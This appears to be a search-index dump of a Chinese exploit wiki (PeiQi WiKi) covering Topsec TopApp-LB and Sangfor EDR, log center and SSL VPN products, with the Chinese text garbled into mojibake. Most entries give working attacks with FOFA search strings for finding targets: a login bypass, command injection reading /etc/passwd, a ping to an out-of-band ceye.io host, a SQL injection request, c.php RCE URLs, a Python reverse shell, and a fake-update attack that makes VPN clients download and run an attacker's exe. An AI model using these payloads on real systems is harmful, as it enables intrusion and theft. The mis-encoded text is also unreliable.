ä»»æ„ç™»é™† å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB å‘½ä»¤æ‰§è¡Œæ¼æ´ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB enable_tool_debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ å¤©èä¿¡LDPæœªæˆæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-27 18:30:39 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™†.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™†.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™†","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBä»»æ„ç™»é™† æ¼æ´æè¿° å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBç³»ç»Ÿæ— éœ€å¯†ç å¯ç›´æ¥ç™»é™†ï¼ŒæŸ¥çœ‹æ•æ„Ÿä¿¡æ¯ å½±å“ç‰ˆæœ¬ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° åœ¨ç™»å½•é¡µé¢ä¸­è¾“å…¥ï¼Œè´¦å·:ä»»æ„è´¦å· å¯†ç :;id æˆåŠŸç™»å½• PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB enable_tool_debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB enable_tool_debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB enable_tool_debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB enable_tool_debug.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° å¤©èä¿¡ TopSec-LB enable_tool_debug.phpæ–‡ä»¶å­˜åœ¨ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€šè¿‡å‘½ä»¤æ‹¼æ¥æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] å¤©èä¿¡ TopSec-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´æ–‡ä»¶ä¸º enable_tool_debug.php commandWrapper.inc æ–‡ä»¶ä¸­çš„ runTool function runTool($val,$tool,$par){ if($val==\"0\"){ UciUtil::setValue('system', 'runtool', 'tool', $tool); UciUtil::setValue('system', 'runtool', 'parameter', $par); UciUtil::commit('system'); if($tool==\"1\"){ exec('ping '.$par.'>/tmp/tool_result &'); }else if($tool==\"2\"){ exec('traceroute '.$par.'>/tmp/tool_result &'); } }else if($val==\"1\"){ $tool=UciUtil::getValue('system', 'runtool', 'tool'); if($tool==\"1\"){ exec('killall ping '); }else if($tool==\"2\"){ exec('killall traceroute '); } UciUtil::setValue('system', 'runtool', 'tool', ''); UciUtil::setValue('system', 'runtool', 'parameter', ''); UciUtil::commit('system'); exec('echo \"\">/tmp/tool_result'); } } è¿™é‡Œè®¾ç½® var=0ï¼Œtool=1ï¼Œå†è¿›è¡Œå‘½ä»¤æ‹¼æ¥é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œ /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |' PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-27 18:30:45 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBå‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LBç³»ç»Ÿå­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œ å½±å“ç‰ˆæœ¬ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»å½•ç•Œé¢ä¸­å­˜åœ¨å‘½ä»¤æ‰§è¡Œ è´¦å·:1;ping 6km5dk.ceye.io;echo å¯†ç :ä»»æ„ æˆåŠŸæ”¶åˆ°è¯·æ±‚ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´ æ¼æ´æè¿° å¤©èä¿¡è´Ÿè½½å‡è¡¡ TopAPP-LBäº§å“æ—§ç‰ˆæœ¬åœ¨ç®¡ç†é¢å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå…·ä½“ä¸ºåœ¨å¯ä»¥è®¿é—®ç®¡ç†æœåŠ¡æƒ…å†µ ä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨ç³»ç»Ÿæ£€æŸ¥è¾“å…¥æ¡ä»¶ä¸ä¸¥æ ¼çš„ç¼ºé™·ï¼Œè¿›ä¸€æ­¥å¯è·å–éƒ¨åˆ†ç³»ç»Ÿæœ¬åœ°ä¿¡æ¯ å½±å“ç‰ˆæœ¬ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° åˆ©ç”¨ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB ä»»æ„ç™»é™† ä½¿ç”¨åå° æäº¤ä»¥ä¸‹æ•°æ®åŒ… POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@ã€‚ã€‚ å­˜åœ¨SQLç›²æ³¨ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡LDPæœªæˆæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡LDPæœªæˆæƒè®¿é—®æ¼æ´.html","title":"å¤©èä¿¡LDPæœªæˆæƒè®¿é—®æ¼æ´","keywords":"","body":"å¤©èä¿¡LDPæœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° å¤©èä¿¡LDPå­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´å½±å“ [!NOTE] å¤©èä¿¡LDP æ¼æ´å¤ç° POCä¸º é»˜è®¤ç”¨æˆ·supermançš„uid=1 POST /?module-auth_user&action=mod_edit.pwd HTTP/1.1 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-09 15:32:24 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/","title":"æ·±ä¿¡æœ","keywords":"","body":"æ·±ä¿¡æœ æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552 æ·±ä¿¡æœåå°ä»»æ„ç”¨æˆ·ç™»é™†æ¼æ´ æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯è¿œç¨‹æ–‡ä»¶ä¸‹è½½ æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 19:54:27 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552.html","title":"æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552","keywords":"","body":"æ·±ä¿¡æœEDRè¿œç¨‹å‘½ä»¤æ‰§è¡Œ CNVD-2020-46552 æ¼æ´æè¿° æ·±ä¿¡æœç»ˆç«¯æ£€æµ‹å“åº”å¹³å°æ˜¯æ·±ä¿¡æœå…¬å¸å¼€å‘çš„ä¸€å¥—EDRç³»ç»Ÿã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯å‘ç›®æ ‡æœåŠ¡å™¨å‘é€æ¶æ„æ„é€ çš„HTTPè¯·æ±‚ï¼Œä»è€Œè·å¾—ç›®æ ‡æœåŠ¡å™¨çš„æƒé™ï¼Œå®ç°è¿œç¨‹ä»£ç æ§åˆ¶æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 æ¼æ´å¤ç° https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami åå¼¹shell POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' å‘ /tool/log/c.php POSTä»¥ä¸‹æ•°æ®å³å¯ strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯è¿œç¨‹æ–‡ä»¶ä¸‹è½½.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯è¿œç¨‹æ–‡ä»¶ä¸‹è½½.html","title":"æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯è¿œç¨‹æ–‡ä»¶ä¸‹è½½","keywords":"","body":"æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯è¿œç¨‹æ–‡ä»¶ä¸‹è½½ æ¼æ´æè¿° æ·±ä¿¡æœ SSL VPN å®¢æˆ·ç«¯å­˜åœ¨è¿œç¨‹æ–‡ä»¶ä¸‹è½½ï¼Œä¸”æ–‡ä»¶å¯æ§ä¸‹è½½åå¯æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] æ·±ä¿¡æœ SSL VPN æ¼æ´å¤ç° ç™¾åº¦\"intitle: æ¬¢è¿ä½¿ç”¨SSL VPN\"ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªåœ°æ–¹ä¸‹è½½VPNå®¢æˆ·ç«¯ä¸‹è½½å®‰è£…ï¼š å®‰è£…å®Œä¹‹åè®¿é—®VPNçš„é¡µé¢ï¼Œå‘ç°VPNä¼šè‡ªåŠ¨ä¸‹è½½ç»„ä»¶æ›´æ–°ï¼š è¿™äº›è¯·æ±‚å‡ä¸ºGETè¯·æ±‚å¹¶é™„å¸¦ç€ä¸€äº›å‚æ•°ï¼Œæˆ‘ä»¬æŠŠå®ƒä¸€ä¸€åˆ—ä¸‹æ¥ï¼š æœ¬åœ°æ¥çœ‹ä¸€ä¸‹è¿™ä¸ª54530ç«¯å£å¯¹åº”çš„è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼š å‘ç°è¿™ä¸ªç«¯å£æ˜¯ECAgent.exeå¼€å¯çš„ï¼Œå¯»æ‰¾åˆ°å¯¹åº”è¿›ç¨‹æ–‡ä»¶æ‰€åœ¨ä½ç½®ï¼š ç¡®è®¤è¿™æ˜¯XXX SSLVPNçš„ç¨‹åºï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†ä¸¤è€…è”ç³»åˆ°ä¸€èµ·ï¼Œè®¿é—®VPNç™»å½•é¦–é¡µä¼šè§¦å‘å¯¹127.0.0.1çš„è®¿é—®ä»è€Œå¼•èµ·VPNè¿›è¡Œç»„ä»¶æ›´æ–°ã€‚ é€šè¿‡ä»¥ä¸Šçš„åˆ†ææˆ‘ä»¬çŒœæµ‹äº†æ•´ä¸ªå¤§è‡´æµç¨‹ï¼Œä½†æˆ‘ä»¬è®¾æƒ³ä¸€ä¸‹å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶æœ¬åœ°çš„æ›´æ–°æŒ‡å‘æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œç„¶åå°†æ›´æ–°çš„ç»„ä»¶å†…å®¹æ›¿æ¢æˆæ¶æ„ç¨‹åºï¼Œå½“ç¨‹åºå¯åŠ¨çš„æ—¶å€™å°±å¯åŠ¨äº†æ¶æ„ç¨‹åºï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°å®‰è£…VPNå®¢æˆ·ç«¯çš„ä½¿ç”¨è€…PCæƒé™ã€‚ å†å›åˆ°ä¹‹å‰çš„æœ¬åœ°é“¾æ¥åˆ—è¡¨ï¼Œæ ¹æ®å¯¹è‹±æ–‡çš„ç†è§£ï¼Œå‚æ•°opçš„å€¼åº”è¯¥ä¸ºå…¶å…·ä½“å¯¹åº”è¦æ‰§è¡Œçš„åŠ¨ä½œï¼š InitECAgent -> åˆå§‹åŒ– GetEncryptKey -> è·å–åŠ å¯†å¯†é’¥ DoConfigure -> é…ç½® CheckReLogin -> æ£€æŸ¥é‡æ–°ç™»å½• CheckProxySetting -> æ£€æŸ¥ä»£ç†è®¾ç½® UpdateControls -> æ›´æ–°æ§åˆ¶ DoQueryService -> æŸ¥è¯¢æœåŠ¡ ç¬¬ä¸€ä¸ªåˆå§‹åŒ–çš„è¯·æ±‚å­˜åœ¨å¯æ§å‚æ•°arg1ï¼š https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.xxx.edu.cn%20443&callback=EA_cb10000 å‚æ•°arg1=vpn.xxx.edu.cn%20443ï¼Œå¯¹åº”å€¼ä¹Ÿå°±æ˜¯HOST+ç©ºæ ¼+ç«¯å£çš„æ ¼å¼ï¼Œçœ‹åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå°±ä¼šæœ‰ä¸€ä¸ªæ€è·¯ï¼Œå®¢æˆ·ç«¯æ›´æ–°æ§ä»¶æ˜¯ä¸æ˜¯æ ¹æ®è¿™ä¸ªæŒ‡å®šå€¼å‘å…¶å‘é€è¯·æ±‚æ›´æ–°çš„å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åªæ›¿æ¢ç¬¬ä¸€ä¸ªåˆå§‹åŒ–è¯·æ±‚çš„arg1å‚æ•°ä¸º172.20.10.2 8000ï¼Œç„¶åæœ¬åœ°æ­å»ºä¸€ä¸ªHTTPæœåŠ¡ï¼š python -m SimpleHTTPServer å…¶ä»–çš„è¯·æ±‚åŸå°ä¸åŠ¨ï¼Œä¾æ¬¡è¯·æ±‚ä¸€éé‚£ä¸€ä»½URL æœåŠ¡ç«¯æˆåŠŸæ”¶åˆ°è¯·æ±‚ï¼Œä½†æ˜¯å´å‡ºç°äº†é”™è¯¯çš„æç¤ºï¼š é¦–å…ˆæˆ‘ä»¬å·²ç»éªŒè¯äº†è‡ªå·±çš„çŒœæƒ³ï¼Œæ›´æ–°åœ°å€æ˜¯è‡ªå·±å¯æ§çš„ï¼Œå®¢æˆ·ç«¯ç¡®å®ä¼šå‘æˆ‘ä»¬æŒ‡å®šçš„æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼Œä½†ç”±äºå‡ºç°äº†é”™è¯¯æˆ‘ä»¬ä¸çŸ¥é“å®¢æˆ·ç«¯è®¿é—®äº†å“ªä¸ªæ–‡ä»¶ï¼Œä¹Ÿä¸çŸ¥é“è®¿é—®æ–‡ä»¶ä¹‹ååšäº†ä»€ä¹ˆåŠ¨ä½œã€‚ ç°åœ¨è¦åšçš„å°±æ˜¯æ­å»ºä¸€ä¸ªå®¢æˆ·ç«¯å¯ä»¥æ­£å¸¸è®¿é—®çš„è¯·æ±‚ï¼Œé€šè¿‡è¿™ä¸ªé”™è¯¯å¤§è‡´å¯ä»¥çŸ¥é“ï¼Œæˆ‘æ­å»ºçš„æœåŠ¡ç«¯åè®®å’Œå®¢æˆ·ç«¯è¯·æ±‚ä½¿ç”¨çš„åè®®ä¸ä¸€è‡´ï¼Œæœ¬æœºæŠ“ä¸ªåŒ…å‘ç°å®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯ HTTPS åè®®ï¼Œè¿™å°±éœ€è¦æ­å»ºä¸€ä¸ª HTTPS æœåŠ¡äº†ã€‚ å¦‚ä¸‹è„šæœ¬åŸºäºPythonåº“å»ºç«‹ä¸€ä¸ª HTTPS æœåŠ¡ï¼š # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer, SimpleHTTPServer import ssl httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), SimpleHTTPServer.SimpleHTTPRequestHandler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() æ­å»ºèµ·ä¸€ä¸ª HTTPS ç¯å¢ƒåå†æ¬¡å¤ç°å¦‚ä¸Šè¯·æ±‚ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°æ—¥å¿—ï¼š å¯ä»¥çœ‹è§å®¢æˆ·ç«¯ä¼šè®¿é—®ä¸¤ä¸ªæ–‡ä»¶ï¼š /com/WindowsModule.xml /com/win/XXXUD.exe å…ˆä¸ç®¡xmlæ–‡ä»¶æ˜¯æ€ä¹ˆæ ·çš„ï¼Œå¯æ‰§è¡Œæ–‡ä»¶(exe)æ˜¯éœ€è¦é‡è§†çš„ï¼Œä½†æ˜¯è¿™é‡Œé€šè¿‡æç¤ºå¯ä»¥çœ‹å‡ºå®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚æ˜¯POSTè¯·æ±‚ï¼Œä½†æˆ‘ä»¬æ‰€å†™çš„Pythonè„šæœ¬å»ºç«‹çš„HTTPSæœåŠ¡å¹¶ä¸æ”¯æŒPOSTæ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦é‡å†™ä¸€ä¸‹Handlerï¼š import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_POST(self): form = cgi.FieldStorage() SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self) Handler = ServerHandler httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), Handler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() æœ€ç»ˆå¦‚ä¸Šè„šæœ¬æ”¯æŒPOSTæ–¹æ³•ï¼Œå½“æ—¶ç”¨POSTæ–¹æ³•è¯·æ±‚æ—¶å³è¿”å›æ–‡ä»¶å†…å®¹ã€‚ æœ€åï¼Œæ‹–ä¸€ä¸ªcalc.exeï¼ˆè®¡ç®—å™¨ï¼‰åˆ°HTTPSç½‘ç«™æ ¹ç›®å½•ä¸‹çš„/com/win/XXXUD.exeã€‚ ä¾æ¬¡è¯·æ±‚ï¼ˆç»è¿‡å¤šæ¬¡å¤ç°å‘ç°ï¼Œè¿™ä¸‰ä¸ªè¯·æ±‚æ‰æ˜¯é‡ç‚¹çš„ï¼Œå…¶ä»–çš„å¯ä»¥å¿½ç•¥ï¼‰ï¼š https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005 ä¼šå‘ç°å®¢æˆ·ç«¯è¯·æ±‚ä¹‹åï¼Œå°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å¹¶å¯åŠ¨è¯¥ç¨‹åºï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼š Exploitå¾ˆç®€å•ï¼Œå½“ç”¨æˆ·æ‰“å¼€æŸä¸ªé¡µé¢æ—¶è®¿é—®é‚£ä¸‰ä¸ªæœ¬åœ°è¯·æ±‚å³å¯ï¼Œè¿™é‡Œä½¿ç”¨JavaScriptçš„fetchå»å®ç°å³å¯ï¼š // æœåŠ¡å™¨IPå’Œç«¯å£ var ip = \"172.20.10.2\"; var port = \"4443\"; var poc_list = [\"https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=\" + ip + \" \" + port + \"&Guid=&callback=EA_cb10000\", \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&token=c4202416e283e60809d3b1e04e4bae6b&Guid=&callback=EA_cb10003\", \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&Guid=&callback=EA_cb10005\"]; for(var i=0; i å…¶æ¬¡å°±æ˜¯éœ€è¦ä¸€ä¸ªHTTPSæœåŠ¡ç«¯çš„Pythonè„šæœ¬ï¼Œå¹¶ä¸”åœ¨è„šæœ¬æ ¹ç›®å½•ä¸‹çš„/com/win/ç›®å½•ä¸‹æœ‰ä¸€ä¸ªXXXUD.exeæ–‡ä»¶ã€‚ å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨ä¸EDRç›¸åŒæ¨¡æ¿å’Œéƒ¨åˆ†æ–‡ä»¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] æ·±ä¿¡æœ æ—¥å¿—ä¸­å¿ƒ FOFA [!NOTE] body=\"isHighPerformance : !!SFIsHighPerformance,\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¿é—®æ¼æ´Url /tool/log/c.php?strip_slashes=system&host=ipconfig PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 19:54:37 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/æ·±ä¿¡æœ/æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° æ·±ä¿¡æœ è¡Œä¸ºæ„ŸçŸ¥ç³»ç»Ÿ c.php 